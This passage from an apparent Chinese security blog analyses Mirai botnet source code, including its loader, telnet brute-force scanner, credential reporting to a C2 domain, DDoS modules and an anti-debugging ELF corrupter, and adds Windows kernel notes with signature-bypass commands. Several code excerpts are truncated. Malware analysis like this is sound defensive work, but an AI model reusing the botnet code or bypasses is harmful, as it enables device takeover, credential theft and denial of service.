--remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./release/dlr.x86 -S移除所有符号表信息 --strip-unneeded移除不需要的符号 --remove-section移除指定的ELF的文件的区段，每个区段一个单独的命令 这里的主要目的就是用来减少再减少文件的体积。 效果如下： 之前只知道strip可以去除符号，但是没想到也可以删除节区，试了试，text节区也可以去除，确实厉害。 main.c 该文件的作用就是利用socket链接的方式，从指定的服务器中，通过建立socket链接，来下载文件，保存到本地，取名为drvhelper的文件中。 主要组织架构： 基本上就这些函数，下面都是大量的syscall函数 start函数 这个函数针对mips架构做了特殊处理，一般情况就直接调用run开始执行 void __start(void) { // 先判断架构 #if defined(MIPS) || defined(MIPSEL) __asm( \".set noreorder\\n\" ; 关闭指令重排序优化, \"move $0, $31\\n\" ; 将返回地址(保存在$31寄存器)保存到$0寄存器 \"bal 10f\\n\" ; 调用一个偏移为10的标签,这会把程序计数器PC压入栈中 \"nop\\n\" ; 配合bal产生正确的偏移 \"10:\\n.cpload $31\\n\"; 标签10位置,调用bal后就会跳转到这里,将栈中保存的PC(也就是shellcode地址)加载到$31寄存器 \"move $31, $0\\n\" ; 将$31寄存器恢复shellcode地址保存到$0寄存器中 \".set reorder\\n\" ; 重新开启指令重排序 ); #endif run(); } 首先创建了socketaddr_in 这个结构体 /* struct attack_target { struct sockaddr_in sock_addr; ipv4_t addr; uint8_t netmask; }; typedef struct sockaddr_in { #if ... short sin_family; #else ADDRESS_FAMILY sin_family; #endif USHORT sin_port; IN_ADDR sin_addr; CHAR sin_zero[8]; } SOCKADDR_IN, *PSOCKADDR_IN; */ 完事之后第一条语句是向stdout写一个文件名称\"MIRAI\\n\"上去： 然后完善一下socket链接需要的端口并且绑定一下本地ip。之后创建本地文件【dvrHelper】，用来盛放远程下载下来的恶意代码 之后利用系统调用创建一个connect链接，sfd就是socket文件描述符、addr就是socket结构体 链接之后就开始构造一个http请求头，向远程请求下载恶意代码 利用上面的特征字符串，将http头和体分开，然后循环读取发送来的内容，保存到本地 上面做好了铺垫，下面就开始利用socket链接进行文件的流式接收和下载操作 写入完成之后就close前面打开的各种描述符。 系统调用分析 运行在iot设备上，所以库不可能很全面，为了减少体积也是为了运行的稳定性，很多功能使用了系统调用，其中最常见的是socket家族的系统调用。 // 使用syscall使用socket函数 int xsocket(int domain, int type, int protocol) { // 如果定义了__NR_socketcall，使用socketcall系统调用；否则使用SYS_connect的系统调用 #if defined(__NR_socketcall) #ifdef DEBUG printf(\"socket using socketcall\\n\"); #endif struct { int domain, type, protocol; } socketcall; socketcall.domain = domain; socketcall.type = type; socketcall.protocol = protocol; // 1 == SYS_SOCKET int ret = syscall(SCN(SYS_socketcall), 1, &socketcall); #ifdef DEBUG printf(\"socket got ret: %d\\n\", ret); #endif return ret; #else #ifdef DEBUG printf(\"socket using socket\\n\"); #endif return syscall(SCN(SYS_socket), domain, type, protocol); #endif } socket家族包含send、recv等很多函数，都是通过系统调用socketcall来实现的 int socketcall(int call，unsiged long* args); 第一个参数存放系统调用号，第二个存放要调用的函数的参数，按照数组的形式。 来自网站：net.h - include/uapi/linux/net.h - Linux source code (v6.4.11) - Bootlin ida来看，这个push 1就是call参数，这里代表的是socket函数。 然后使用syscall来调用socketcall，以此调用socket函数。 从这个网页可以看到源码和调用过程：socket.c - net/socket.c - Linux source code (v6.4.11) - Bootlin 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-25 10:03:53 "},"MyArticles/Botnet/loader.html":{"url":"MyArticles/Botnet/loader.html","title":"loader","keywords":"","body":"loader模块分析 目录分布如下：向被感染的设备上传对应架构的payload文件。 binary.c 将bins目录下的文件读取到内存中，以echo方式上传 connection.c loader和感染设备telnet交互 main.c 主函数 server.c 向感染设备上传payload文件 telnet_info.c 自定义解析telnet信息 util.c 一些常用的公共函数 main.c 主要负责功能调度和初始化telnet登录信息以及环境信息建立socket链接。在启动之初就会判断这个文件夹是否存在（binary.c），然后启用了一个epoll架构的简单服务器(epoll.c)，一旦有新的连接就启动一个新的worker线程。 ip转整数 将ip地址的格式转换成网络字节序。这也是botnet中常见的操作。 读取程序的参数作为目标，读取参数也是botnet中的常用手法，从后面的几个家族的分析中来看使用的非常频繁，也可以防止自己被沙箱自动运行。 接下来就开始将现成和cpu核心进行绑定，提高运行的效率，这也是可以通过cpu的异常活跃来判断是否成为僵尸网络。 完事初始化一下telnet的设置，方便后续爆破链接。 telnet_info.c 主要有两个函数，负责解析telnet登录返回的账号、密码信息。 // 解析格式给telnet结构体赋值 // struct telnet_info { // char user[32], pass[32], arch[6], writedir[32]; // ipv4_t addr; // port_t port; // enum { // UPLOAD_ECHO, // UPLOAD_WGET, // UPLOAD_TFTP // } upload_method; // BOOL has_auth, has_arch; // }; // telnet_info的一个构造函数 struct telnet_info *telnet_info_new(char *user, char *pass, char *arch, ipv4_t addr, port_t port, struct telnet_info *info) { if (user != NULL) strcpy(info->user, user); if (pass != NULL) strcpy(info->pass, pass); if (arch != NULL) strcpy(info->arch, arch); info->addr = addr; info->port = port; info->has_auth = user != NULL || pass != NULL; info->has_arch = arch != NULL; return info; } // 拆分用户信息，并且给info结构体赋值 struct telnet_info *telnet_info_parse(char *str, struct telnet_info *out) // Format: ip:port user:pass arch { char *conn, *auth, *arch; char *addr_str, *port_str, *user = NULL, *pass = NULL; /** typedef uint32_t ipv4_t; typedef uint16_t port_t; */ ipv4_t addr; port_t port; // 用空格分开，得到第一个参数 if ((conn = strtok(str, \" \")) == NULL) return NULL; // 得到第二个参数 if ((auth = strtok(NULL, \" \")) == NULL) return NULL; //得到第三个参数，但是不重要 arch = strtok(NULL, \" \"); // We don't care if we don't know the arch // 得到第一个参数的ip和端口 if ((addr_str = strtok(conn, \":\")) == NULL) return NULL; if ((port_str = strtok(NULL, \":\")) == NULL) return NULL; // 判断用户名和密码是不是空的以及是不是符合要求 if (strlen(auth) == 1) { if (auth[0] == ':') { user = \"\"; pass = \"\"; } else if (auth[0] != '?') return NULL; } else { // 分解得到用户名和密码 user = strtok(auth, \":\"); pass = strtok(NULL, \":\"); } addr = inet_addr(addr_str); port = htons(atoi(port_str)); return telnet_info_new(user, pass, arch, addr, port, out); } binary.c 将bin目录下的二进制程序读取到内存中来，利用用到了linux下的一个编程技巧 // glob库函数用于Linux文件系统中路径名称的模式匹配，即查找文件系统中指定模式的路径。 #include \"headers/glob.h\" load函数 // #define BINARY_BYTES_PER_ECHOLINE 128 // 将指定文件（对应架构的文件），每次128字节，读取到内存中来 // bin结构体 文件名称 static BOOL load(struct binary *bin, char *fname) { FILE *file; char rdbuf[BINARY_BYTES_PER_ECHOLINE]; int n; // 打开指定的文件，打不开返回失败 if ((file = fopen(fname, \"r\")) == NULL) { printf(\"Failed to open %s for parsing\\n\", fname); return FALSE; } // 从file文件种读取128字节，按照char类型，放到rdbuf缓冲区中。n是读取到的字节数 while ((n = fread(rdbuf, sizeof (char), BINARY_BYTES_PER_ECHOLINE, file)) != 0) { char *ptr; int i; // realloc（调整之前的内容空间） 扩充payload内存空间。 bin->hex_payloads = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof (char *)); // calloc申请一个新的字符串内存,每个字节的16进制表示需要4个字符（00 -> \\x00）,再加上结尾空字节 bin->hex_payloads[bin->hex_payloads_len] = calloc(sizeof (char), (4 * n) + 8); // 将新字符串内存首地址保存到ptr指针 ptr = bin->hex_payloads[bin->hex_payloads_len++]; for (i = 0; i 上述函数负责将文件写道内存里，同时需要下面的函数来确定平台的架构，来选择合适的文件。 binary_init函数 // struct binary { // char arch[6]; // int hex_payloads_len; // char **hex_payloads; // }; BOOL binary_init(void) { glob_t pglob; int i; // 匹配bins目录下的所有的dlr开头的文件 if (glob(\"bins/dlr.*\", GLOB_ERR, NULL, &pglob) != 0) { printf(\"Failed to load from bins folder!\\n\"); return; } // 遍历上述得到的文件 for (i = 0; i arch, strtok(NULL, \".\")); load(bin, pglob.gl_pathv[i]); } globfree(&pglob); return TRUE; } // 返回特定架构的文件结构体，失败返回NULL struct binary *binary_get_by_arch(char *arch) { int i; for (i = 0; i arch) == 0) return bin_list[i]; } return NULL; } 检查平台的架构，从bin目录中选择名称合适的架构文件，并移交给load函数。 server.c 这个目的在于构建一个高性能的网络服务器，向受感染的设备下发控制命令，组件僵尸网络。这个是运行在攻击者的自己的服务器上的，向感染设备发起telnet交互，上传payload文件。 handle_event函数 这个函数是核心函数，里面的while+switch决定了程序的主要通联行为。通过调试信息可以很方便的得知每一个case的功能。 woker线程使用scanner提供的IP地址和账户密码信息登录IOT设备 执行/bin/busybox ps和/bin/busybox cat /proc/mounts查看挂载分区。 创建文件、使用chmod命令调整文件权限至777，之后使用cpuinfo命令判断设备运行平台，再使用wget、tftp或echo三种方式将对应版本的恶意可执行文件上传到设备。 busybox 这也是botnet里常用的一种执行shell命令的方式。它提供了大约 400 个常见 UNIX/Linux 命令的精简实现。 BusyBox 实现删除了不常见的、很少使用的命令选项。所以一般的iot设备都是用了这个来代替bash。 connection.c 判断loader和感染设备telnet交互过程中的状态信息。 文件里的函数功能就是判断telnet交互过程中的各种状态来判断连接是不是正常或者有其他情况等等。 util.c 这个文件一般都不去看，确实也没有什么攻击实际意义，但是这些代码在botnet中的重用率很高，所以还是看了一下。 其中的一些算法也可以学习一下。比如是 util_sockprintf // 将可变参数通过socket(fd)进行发送 BOOL util_sockprintf(int fd, const char *fmt, ...) { // 格式化输出的缓冲区 char buffer[BUFFER_SIZE + 2]; va_list args; int len; // 初始化可变参数的获取 va_start(args, fmt); // 格式化写入buffer len = vsnprintf(buffer, BUFFER_SIZE, fmt, args); // 结束可变参数获取 va_end(args); if (len > 0) { // 输出按照大小截断 if (len > BUFFER_SIZE) len = BUFFER_SIZE; #ifdef DEBUG hexDump(\"TELOUT\", buffer, len); #endif // 通过socket发送 if (send(fd, buffer, len, MSG_NOSIGNAL) != len) return FALSE; } return TRUE; } util_memsearch // 在buf中寻找mem子字符串，并返回匹配到的最后一个字符在源字符串中的索引 int util_memsearch(char *buf, int buf_len, char *mem, int mem_len) { int i, matched = 0; // 目标字符串比原字符串长，直接返回推出 if (mem_len > buf_len) return -1; // 遍历buf寻找mem for (i = 0; i 参考 https://blog.ciaran.cn/2018/10/09/Mirai%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/ https://paper.seebug.org/142/#21-payload https://www.jianshu.com/p/9a460a3723f8 http://blog.nsfocus.net/mirai-source-analysis-report/ 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-25 11:57:56 "},"MyArticles/Botnet/bot.html":{"url":"MyArticles/Botnet/bot.html","title":"bot","keywords":"","body":"bot目录 一般捕获的botnet样本基本都相当于bot目录，这个目录主要包含了ddos攻击、扫描爆破、dns解析等功能。 util模块 手动实现了大量的库函数，来提高程序运行的稳定性。 rand模块 这个模块无关紧要，但是正是这种无关紧要的函数，却被大量的botnet家族复用，在分析的时候出现的频率很高，随机的思路也基本一样，算法也大差不差。尤其是这个函数 ddos攻击 内置了几种攻击方式，通过attack.c进行统一调度。 attack.c 攻击方式按照协议进行分类，每种协议又包含了不同的攻击方式。 attack_udp.c udp攻击主要实现了： vse攻击，针对游戏服务器 udp stander攻击 udp 自定义攻击 三种攻击方式。 attack_tcp.c 实现了syn攻击、ack攻击还有stomp攻击三种方式。 attack_gre.c gre攻击，利用GRE（通用路由封装）协议中的数据包发送大量无效数据，以破坏网络服务或使网络瘫痪。比较出名的事件就是： Mirai僵尸网络利用GRE泛洪在2016年攻击了新闻记者Brian Krebs的博客。 attack_app.c 主要是针对http的洪水攻击 attack_app_cfnull 与GET / POST泛洪类似，它旨在发送大量垃圾，导致其消耗目标的服务器资源。 scanner扫描 这个模块他写了将将1000行代码，真下功夫。下面是该模块的构成函数 // 将接收到的空字符替换为'A' int recv_strip_null(int sock, void *buf, int len, int flags) // 检查剩余缓冲区长度是否足够,从而避免指针越界 static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount) // 解密函数 static char *deobf(char *str, int *len) // 将扫描成功的结果上报 static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth) // 随机返回一条auth_table中的记录 static struct scanner_auth *random_auth_entry(void) // 向auth_table中添加字典数据 static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight) // 检查接收缓冲区,寻找登录提示结束符位置 static int consume_user_prompt(struct scanner_connection *conn) static int consume_pass_prompt(struct scanner_connection *conn) static int consume_resp_prompt(struct scanner_connection *conn) // 从内存中，查找命令的末尾位置 static int consume_any_prompt(struct scanner_connection *conn) // 只要客户机或服务器要发送命令序列而不是数据流，它就在数据流中插入一个特殊的保留字符，该保留字符叫做“解释为命令”（IAC：0xff ，Interpret As Command) 字符。 static int consume_iacs(struct scanner_connection *conn) // 随机生成一个符合要求的公网ip static ipv4_t get_random_ip(void) // 向扫描到的存活的ip、端口发起链接 static void setup_connection(struct scanner_connection *conn) // 扫描进程pid为全局变量，这里直接kill void scanner_kill(void) // 主要的扫描和爆破功能模块 void scanner_init(void) // 将接收到的空字符替换为'A' int recv_strip_null(int sock, void *buf, int len, int flags) scanner_init 这个函数实现了扫描功能的初始化和扫描功能。使用了读取socket连接的方式来获取本地ip。这个模块被botnet后代子孙广泛使用。 ipv4_t util_local_addr(void) { int fd; struct sockaddr_in addr; socklen_t addr_len = sizeof (addr); errno = 0; if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) { #ifdef DEBUG printf(\"[util] Failed to call socket(), errno = %d\\n\", errno); #endif return 0; } addr.sin_family = AF_INET; addr.sin_addr.s_addr = INET_ADDR(8,8,8,8); addr.sin_port = htons(53); // 仅仅作为链接到8888，方便后续利用getsockname函数获取本地局域网ip connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)); // getsockname(fd, (struct sockaddr *)&addr, &addr_len); close(fd); return addr.sin_addr.s_addr; } 每次可以进行160个线程的扫描，采用了异步无状态扫描方式，提高扫描效率。 后面就记录扫描中得到的有意义的目标进行保存，方便后续爆破。扫描和爆破是分开的，先扫描得到有价值目标再进行爆破。 mirai中的扫描目标是随机生成的，去掉了几个没有攻击意义的，后代儿孙中基本都是下发扫描区段来扫描。 扫描爆破完事之后，决定权不在bot手里，要将数据上报给loader服务器进行定夺。 // 将扫描成功的结果上报 static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth) { struct sockaddr_in addr; int pid = fork(), fd; struct resolv_entries *entries = NULL; if (pid > 0 || pid == -1) return; if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) { #ifdef DEBUG printf(\"[report] Failed to call socket()\\n\"); #endif exit(0); } table_unlock_val(TABLE_SCAN_CB_DOMAIN); table_unlock_val(TABLE_SCAN_CB_PORT); entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL)); if (entries == NULL) { #ifdef DEBUG printf(\"[report] Failed to resolve report address\\n\"); #endif return; } addr.sin_family = AF_INET; addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len]; addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL)); resolv_entries_free(entries); table_lock_val(TABLE_SCAN_CB_DOMAIN); table_lock_val(TABLE_SCAN_CB_PORT); if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1) { #ifdef DEBUG printf(\"[report] Failed to connect to scanner callback!\\n\"); #endif close(fd); exit(0); } uint8_t zero = 0; send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL); send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL); send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL); send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL); send(fd, auth->username, auth->username_len, MSG_NOSIGNAL); send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL); send(fd, auth->password, auth->password_len, MSG_NOSIGNAL); #ifdef DEBUG printf(\"[report] Send scan result to loader\\n\"); #endif close(fd); exit(0); } dns解析 resolv.c mirai的C2基本是域名，在回传之前先通过自己写的dns解析服务利用8.8.8.8进行解析，然后再发回数据包。 扫描爆破用的密码本是硬编码的，但是被加密了，用之前解密，用完后加密，降低曝光率。不少的家族都是用了差不多的方式。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-25 15:28:37 "},"MyArticles/Botnet/cnc.html":{"url":"MyArticles/Botnet/cnc.html","title":"cnc","keywords":"","body":"CNC模块 cnc模块并不是样本的一部分，而是独立运行在攻击者服务端的一个程序。为购买攻击服务的人提供操作平台；控制受害主机。 都是基于go语言开发的。优点是go语言是一个原生的网络友好的语言，天然的支持高并发还有网络编程的简便性，这些优点让他成为了最佳选项。但是缺点就是我不会go语言。 主要功能 接受用户登录，利用mysql作为登录信息的存储 接收下发指令，控制攻击行为 剩下的具体细节等我了解go语言之后再说。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-25 15:38:19 "},"MyArticles/Botnet/tools.html":{"url":"MyArticles/Botnet/tools.html","title":"tools","keywords":"","body":"主要是实现了一些工具，比如加密解密信息等等的。还实现了一个wget函数，其中的加密模块重用率还是比较高的，虽然key不同，但是方式基本相同。 x void *x(void *_buf, int len) { unsigned char *buf = (char *)_buf, *out = malloc(len); int i; uint8_t k1 = table_key & 0xff, k2 = (table_key >> 8) & 0xff, k3 = (table_key >> 16) & 0xff, k4 = (table_key >> 24) & 0xff; for (i = 0; i nodbg 这是用来对抗gdb调试的，linux下的调试器并没有Windows上那么丰富，大多数还是基于gdb，所以对抗gdb就相当于对抗了很多。 #include #include #include #include #include #include #include #include #include int main(int argc, char** argv) { int f; static Elf32_Ehdr* header; printf(\".: Elf corrupt :.\\n\"); if(argc e_shoff, header->e_shnum, header->e_shstrndx); header->e_shoff = 0xffff; header->e_shnum = 0xffff; header->e_shstrndx = 0xffff; printf(\"[*] Patched header values:\\n\"); printf(\"\\te_shoff:%d\\n\\te_shnum:%d\\n\\te_shstrndx:%d\\n\", header->e_shoff, header->e_shnum, header->e_shstrndx); if(msync(NULL, 0, MS_SYNC) == -1){ perror(\"msync\"); close(f); return 1; } close(f); munmap(header, 0); printf(\"You should no more be able to run \\\"%s\\\" inside GDB\\n\", argv[1]); return 0; } 上述代码的思路还是修改elf的文件头来对抗gdb的，但是如果通过ida远程影响还是小一些。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-25 12:02:58 "},"MyArticles/Botnet/botnetGroup/temp.html":{"url":"MyArticles/Botnet/botnetGroup/temp.html","title":"boat （ripper）家族起底分析报告","keywords":"","body":"参见 “绿盟科技博客” 或者 公众号：“绿盟科技威胁情报” 等写的报告全都被发出去了或者过一段时间之后再把详细的报告上传到该模块中 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-25 15:41:27 "},"MyArticles/Botnet/lm工作总结.html":{"url":"MyArticles/Botnet/lm工作总结.html","title":"总结 - botnet 还有 实习","keywords":"","body":"[TOC] 工作内容 工作内容可以分为两大块： 写snort 分析僵尸网络 snort snort作为每周的固定工作有相对完善的自动化脚本和工作流程，除了枯燥之外速度上还是很快的，截至8.24，我已经提取了120多条有意义的规则和40多条筛选绿色流量包的规则，总计筛选pcap约有11000个。辅助数据整理py脚本5个，爬虫脚本2个。审查snort规则不好统计，反正一周平均100个左右。 因为主客观因素我对我提取的规则并不自信，我并不认为是高质量的规则，即使能命中恶意流量，也不一定能准确命名攻击来源。数据来源有三个，微步、vt、安恒威胁中心（不得不说，安恒的这方面做的真好，上一个实习的时候也是爬的他家的平台）。 通过snort规则，极大的帮助我补充了大鲨鱼的使用方式和实际有用的计算机网络的知识，这可比啃计算机网络那本书快多了，而且都是实际的真东西，学会走之前要先跑起来。这是非常难得的机会，因为在学校我肯定不会去干这些事，也没有平台去获得去测试。同时对威胁平台的操作更加熟练了，真切的使用到了平台的一些功能，而不仅仅是看一眼行为就拉倒。 僵尸网络 这是中前期出现的新任务，前期的任务就是提取规则，僵尸网络的出现极大的改善了我的工作心态。截至8.24，分析僵尸网络5个，boat、gang123、andoryu、Muhstik、ntp这些，为了能够更顺利的分析样本，我花了大半个月完整阅读了mirai的源码，深受启发，发现天下样本一大抄，很少有自研的东西在里面。其中很高兴能协助发现gang123这个新家族，虽然他很小，但是小也很可爱啊。 样本都是新的，这就更有意思了，在学校个人很难拿到新的样本，获得的样本基本都是后端关闭或者已经过时的了，依托沙箱拿到新样本的感觉确实很爽，真正抓到后端发来的攻击指令，也很有成就感，去登录C2的服务器确实很爽。这让我的分析技术不仅仅是停留在了本地，更全方位的提高了我的分析技术。这是我个人很难做到的。 分析样本的过程中，我的分析能力也得到了提高，同时针对linux平台下的分析技术也有了长进，了解学习了linux下的一些新的调试工具的使用，比如edb等，真正学会了怎么使用ida远程调试去脱压缩壳，以及更加完善的分析流程和分析方法。接触到了fakenet这个火眼开发的工具，本地伪造网络信息，让分析过程变得更加方便，即使后端死了，那又何妨，这个工具是我最大的收获之一。总结出来的僵尸网络的分析流程： 新样本本地算hash去搜hash，有些新样本先内部消化完再往公共平台上发 先找C2测试存活，尝试获得更多关联样本 vt的关联功能真好用，尽力关联到更多的信息和C2，看看有没有活的 利用公寓的电脑扫C2，看看开放了什么服务 同组样本、历史样本对照分析，攻击函数反推指令功能，动调的时候挂上抓包。 重点在于通信、攻击方式、关联其他组织家族等等。 写报告、改报告。 同时也根据兵哥修改的报告学习了在企业中的分析报告的侧重点和关键点。把报告写的像wp那样并不合适，详略得当才是真有技术。还需要练习如何剔出重点和大家关注的地方。 通过家族的攻击样本，可以窥见家族的开发水平，有些家族的开发水平真不咋地。有些却非常巧妙，除了分析样本，学习样本中的攻击手法、隐藏手法也是巨大的收获，学到了很多之前不曾了解的知识，比如修改本身进程名称，进程伪装，linux下的夺舍，喂狗行为，socks通信等等之前听说过的和没听说过的都趁着机会学习了一番，还有曾经觉得很神秘的ddos一直觉得需要专门的工具流程，现在终于明白了他的原理，其实就是基本的while套send，通过僵尸网络学习到了很多听说过但是并没有学习的知识，收获颇丰。 总的来说我认为我的样本分析报告还是比提取的规则要好的，但是在叙述上还是不尽如人意，以及一些功能的分析并不透彻。我试图去搞清楚他每一个攻击的实现原理，但是因为种种原因，有的清楚了，有的还不是那么清楚。 总结 做好了打持久战的准备，但是发现秋招比较紧张，有点出乎意料，只好先跑一步血亏房租押金。 合适的工作比填鸭式的上学更能学到东西。在学校中主要在学习的方向是Windows平台的分析还有一些攻击、免杀的一些方面。也是停留在本地的分析上。 在这段时间中的工作内容主要是snort规则提取，和僵尸网络的分析。在面试的时候，面试官给我说去了解一下sigma规则，工作会用到，来的时候学会了yara和sigma，但是工作内容是snort，还是比较有挑战性的，需要现学。 僵尸网络主要作用环境是linux，主要架构也是arm和misp居多，在学校不打pwn之后，就很少接触到linux环境了。 总的来说这次实习的工作内容是对我技术栈的一次查漏补缺，补齐了linux下的分析技术和网络层这块短板，同时也学到了很多耳熟能详但是没有深入了解的攻击技术，还有很多很有意思的攻击方式。 分析新鲜的、真实的、有明确目的的攻击样本，这种体验很奇妙，这是最接近网络安全攻击的任务，虽然在电脑前面、但是还是很刺激。 我一直都是认为样本分析不仅仅是要做逆向，出报告，更重要的是从各种攻击样本中学习他们的攻击手法，读书是和作者交流，分析样本也是一样，直接从样本中学习攻击方式，通过修改ida提取的代码让他可以跑起来，我认为这是最快的学习方式，而且人家代码都给你了，还有claude、gpt这些帮手。不像视频网课还要去qq群去百度云下，这次工作经历更加印证了我的这个想法。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-24 16:05:29 "},"MyArticles/winkernel.html":{"url":"MyArticles/winkernel.html","title":"Windows kernel学习","keywords":"","body":"记录、学习win kernel的一些知识，以及一些突发奇想的恶意尝试 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-13 12:57:16 "},"MyArticles/WinKernel/base_env.html":{"url":"MyArticles/WinKernel/base_env.html","title":"开发、调试环境","keywords":"","body":"Windows kernel学习之前需要进行的基础环境配置以及调试环境配置。 环境配置 ​ visual studio 2022，安装sdk和wdk，这里sdk和wdk的版本要合适，比如wdk10就没法开发win7适配的驱动，写出来的驱动直接放win7上跑一跑就蓝屏。 下载 ​ 按照这个网页从头往下装就行，win10还是win11其实差不多，内核版本一样就行。 下载 Windows 驱动程序工具包 (WDK) - Windows drivers | Microsoft Learn下载之后双击安装，就可以了。 配置环境 下载过程简单，也没有给什么选择的余地，注意C盘空间富裕。 使用vs2022+wdk10进行开发，只支持win10及以上版本，不支持win7 首先需要安装wdk，安装wdk需要sdk，所以需要安装： vs2022 sdk wdk 新建KDME（kernel driver mode empty）项目： 源代码那里创建.c文件，然后写一个helloworld，之后ctrl+b或者ctrl+shift+b就可以在对应目录中找到.sys文件了。 PS：如果出现什么什么spectre漏洞缓解，就去vs installer里下载对应架构的补丁 完事就可以写驱动代码了 #include NTSTATUS unload(PDRIVER_OBJECT driver) { DbgPrint(\"Driver unload success..\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) { driver->DriverUnload = unload; DbgPrint(\"Hello World\\n\"); return STATUS_SUCCESS; } 运行 开启测试模式 不开启测试模式，没有合法签名的驱动不能运行，通过管理员权限的命令界面都可以开启，开启后需要重启系统。 bcdedit /set testsigning on ;开启测试模式 bcdedit /set debug on ;开启调试模式 bcdedit /set loadoptions ddisable_integrity_checks ;关闭签名验证 关闭就是off 因为驱动没有输出缓冲区，所以不能直接打印，只能按照日志格式打印。需要用到debugview这个工具去监视还有drivermanager去启动驱动（sys不能双击运行，启动方式很多，这个比较简单）。 测试还是成功的： 测试模式过DSE签名 win64位都有的DSE保护，驱动强制签名保护，调试模式也得要求签名，但是可以通过修改驱动入口 _KLDR_DATA_TABLE_ENTRY 里面的 Flags 标志位来取消签名验证，但是只能在调试模式下使用。 PKLDR_DATA_TABLE_ENTRY pLdrData =(PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection; pLdrData->Flags = pLdrData->Flags | 0x20; 上面是书上说的，但是在我实际的操作过程中发现其实不需要，直接用那两个工具（debugview、drivermanager）就可以直接运行了。 调试 常见思路就是通过VMware建立串口进行远程调试。然后使用windbg进行远程调试。不能用x64dbg进行调试，因为xdbg就在用户层，和驱动隔着r1和r2两层呢。 逆向方式 Windows内核驱动程序静态逆向工程的方法论-安全客 - 安全资讯平台 (anquanke.com) 原文：Methodology for Static Reverse Engineering of Windows Kernel Drivers | by Matt Hand | Medium 实际分析 [原创]某被外挂用烂了的读写驱动样本全逆向+功能分析-软件逆向-看雪-安全社区|安全招聘|kanxue.com ida动调 IDA6.8 双机调试驱动搭建 - 『软件调试区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-25 14:23:20 "},"MyArticles/WinKernel/程序隐藏技术-概述.html":{"url":"MyArticles/WinKernel/程序隐藏技术-概述.html","title":"概述 - 藏匿程序的方式","keywords":"","body":"学习Windows10基础下的一些关于程序隐藏的技术，程序隐藏可以增加分析人员的逆向成本，同时可以将入门分析者挡在门外，甚至对网络安全从业者实施攻击，造成更大的危害。 windows系统分层 x86架构的处理器有四层，ring0 - ring3，Windows系统使用其中的两层ring0（内核）和ring3（用户）。用户模式下程序最终还是通过ntdll.dll去调用内核。如下图所示 系统架构 1、内核主要组件 Windows 执行体：Windows 操作系统内核模块偏上 层的部分，包括了许多基本的操作系统服务和系统组件，如进程与线程管理器内存管理器，IO 管理器等，主要负责整个操 作系统的对外功能，并提供应用程序需要的内核服务。 Windows 内核：提供了操作系统最基本的服务，如多处理器同步，线程调度，中断分发等，执行体通常利用 Windows 内核提供的例程和对象实现更加复杂的功能。 Windows 驱动程序：包括设备驱动程序和软件驱动程序，主要负责将 IO 管理器的请求转化为特定的硬件设备请求。更详细的内 容会在下面介绍。 硬件抽象层：主要目的是将不同硬件之间的差异隐藏起来， 为上层操作系统提供抽象且一致的硬件接口，提高 Windows 操作系统的兼容性和可移植性，使 Windows 操作系统在面对不同厂商制造的不同硬件设备时依然能够用统一的方式处理。 窗口管理程序与图形驱动：主要用于处理图形界面绘制，窗体控制等功能，在视窗操作系统中非常重要。 驱动程序 Windows作为闭源的操作系统，他不允许一般的程序去访问内核，但是他为了各种硬件的拓展性，所以提供了驱动。 驱动一开始是只有硬件驱动，将程序变成电信号去控制硬件。后来添加了软件驱动。 2、系统调用流程 这里提到的系统调用并不是syscall，而是通过ntdll.dll从r0 - r3的一个过程。 CPU 从 Ring3 进入 Ring0 的手段主要包括中断，异常和自陷三种。 中断：自外部设备的中断请求 异常：指令执行失败之后在系统空间对异常进行处理 自陷： CPU 通过自陷指令主动进入 Ring0。 Windows 系统调用函数一般依靠自陷指令实现。 方式 syscall：新款的系统调用，32位是sysenter INT 2E：老式的系统调用（奔腾 2 之前的处理器） 下图阐述了系统调用的基本流程： WriteFile()函数为例 1、转到 ntdll.dll 中的 NtWriteFile()函数 2、系统会调用 ntdll.dll 中的 KiFastSystemCall()函数，设置 MSR 寄存器的值之后进入系统内核 3、操作系统通过 nt!KiFastCallEntry()函数分发系统调用， 调用内核空间中的同名异前缀函数 nt!NtWriteFile() 4、IO 管理器将 IO 请求封装成输入输出请求包(IO Request Package , IRP)发送给最上层驱动程序 5、IRP 沿着驱动程序栈一路向下传递，最后传递给硬件抽象层，由硬件完成指定功能 win10安全机制 1、Secure Boot 传统的BIOS启动会导致Bootkit问题 